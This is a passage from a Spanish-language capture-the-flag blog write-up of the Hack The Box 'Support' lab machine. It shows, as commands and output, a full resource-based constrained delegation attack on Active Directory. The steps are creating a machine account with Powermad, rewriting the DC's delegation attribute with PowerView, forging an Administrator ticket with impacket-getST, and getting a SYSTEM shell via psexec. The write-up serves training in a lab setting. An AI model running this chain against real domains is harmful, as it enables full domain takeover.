<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; download C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\2</span>0240329132001_BloodHound.zip info.zip

Info: Downloading C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\2</span>0240329132001_BloodHound.zip to info.zip

Info: Download successful!
</code></pre></div></div>

<ul>
  <li>Vemos que hay un grupo que se llama <strong>Shared Support Accounts</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; net group

Group Accounts <span class="k">for</span> <span class="se">\\</span>

<span class="nt">-------------------------------------------------------------------------------</span>
<span class="k">*</span>Cloneable Domain Controllers
<span class="k">*</span>DnsUpdateProxy
<span class="k">*</span>Domain Admins
<span class="k">*</span>Domain Computers
<span class="k">*</span>Domain Controllers
<span class="k">*</span>Domain Guests
<span class="k">*</span>Domain Users
<span class="k">*</span>Enterprise Admins
<span class="k">*</span>Enterprise Key Admins
<span class="k">*</span>Enterprise Read-only Domain Controllers
<span class="k">*</span>Group Policy Creator Owners
<span class="k">*</span>Key Admins
<span class="k">*</span>Protected Users
<span class="k">*</span>Read-only Domain Controllers
<span class="k">*</span>Schema Admins
<span class="k">*</span>Shared Support Accounts
The <span class="nb">command </span>completed with one or more errors.
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos ver eso en <strong>Bloodhound</strong>.</p>
  </li>
  <li>
    <p>El grupo <code class="language-plaintext highlighter-rouge">SHARED SUPPORT ACCOUNTS</code> tiene <code class="language-plaintext highlighter-rouge">GenericAll</code> en el <code class="language-plaintext highlighter-rouge">DC</code> .</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/priv.png" />
</p>

<h1 id="resource-based-constrained-delegation-attack">Resource based constrained delegation attack</h1>

<ul>
  <li>
    <p>En este post nos explican como funciona todo <a href="https://github.com/tothi/rbcd-attack">https://github.com/tothi/rbcd-attack</a>, <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation</a>.</p>
  </li>
  <li>
    <p>Para explotar esto necesitaremos de lo siguiente <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>, <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1</a>.</p>
  </li>
  <li>
    <p>Ahora lo subimos ala maquina y lo importamos para que lo interprete.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/PowerView.ps1

Info: Uploading /home/miguel/Hackthebox/Support/content/PowerView.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\P</span>owerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
<span class="nt">-a----</span>         3/29/2024   2:34 PM         770279 PowerView.ps1
<span class="nt">-a----</span>         3/29/2024   1:18 PM        1343488 SharpHound.exe
<span class="nt">-a----</span>         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owerView.ps1
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/Powermad.ps1

Info: Uploading /home/miguel/Hackthebox/Support/content/Powermad.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\P</span>owermad.ps1

Data: 180768 bytes of 180768 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owermad.ps1
</code></pre></div></div>

<ul>
  <li>Vamos a comenzar creando un <strong>Computer object</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; New-MachineAccount <span class="nt">-MachineAccount</span> Nuevo <span class="nt">-Password</span> <span class="si">$(</span>ConvertTo-SecureString <span class="s1">'123456'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span><span class="si">)</span> <span class="nt">-Verbose</span>
Verbose: <span class="o">[</span>+] Domain Controller <span class="o">=</span> dc.support.htb
Verbose: <span class="o">[</span>+] Domain <span class="o">=</span> support.htb
Verbose: <span class="o">[</span>+] SAMAccountName <span class="o">=</span> Nuevo<span class="err">$</span>
Verbose: <span class="o">[</span>+] Distinguished Name <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Nuevo,CN<span class="o">=</span>Computers,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
<span class="o">[</span>+] Machine account Nuevo added
</code></pre></div></div>

<ul>
  <li>Comprobamos que exista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Get-DomainComputer Nuevo


pwdlastset             : 3/29/2024 2:39:18 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Nuevo,CN<span class="o">=</span>Computers,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
objectclass            : <span class="o">{</span>top, person, organizationalPerson, user...<span class="o">}</span>
name                   : Nuevo
objectsid              : S-1-5-21-1677581083-3380853377-188903654-6101
samaccountname         : Nuevo<span class="err">$</span>
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 3/29/2024 9:39:18 PM
instancetype           : 4
usncreated             : 90263
objectguid             : df9abf14-106b-4628-af15-0893a1ecf055
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : <span class="nv">CN</span><span class="o">=</span>Computer,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : <span class="o">{</span>RestrictedKrbHost/Nuevo, HOST/Nuevo, RestrictedKrbHost/Nuevo.support.htb, HOST/Nuevo.support.htb<span class="o">}</span>
ms-ds-creatorsid       : <span class="o">{</span>1, 5, 0, 0...<span class="o">}</span>
badpwdcount            : 0
cn                     : Nuevo
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 3/29/2024 9:39:18 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 90265
dnshostname            : Nuevo.support.htb
</code></pre></div></div>

<ul>
  <li>Vamos a seguir con los pasos que nos dan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$ComputerSid</span> <span class="o">=</span> Get-DomainComputer Nuevo <span class="nt">-Properties</span> objectsid | Select <span class="nt">-Expand</span> objectsid
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="nt">-ArgumentList</span> <span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="si">$(</span><span class="nv">$ComputerSid</span><span class="si">)</span><span class="s2">)"</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SDBytes</span> <span class="o">=</span> New-Object byte[] <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SD</span>.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Get-DomainComputer dc | Set-DomainObject <span class="nt">-Set</span> @<span class="o">{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora usaremos impacket para obtener un ticket suplantando al Administrator.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getST <span class="nt">-spn</span> cifs/dc.support.htb <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> 10.129.245.29 support.htb/Nuevo<span class="nv">$:</span>123456
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora vamos a exportar la variable de entorno con el nombre del ticket.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora ya nos podemos conectar y leer la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-psexec <span class="nt">-k</span> dc.support.htb
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file GoDYfrro.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service tmuw on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service tmuw.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.20348.859]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
7088702023ddab61e77faaf6ac6fcbc2
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/easy/2024/04/11/support.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
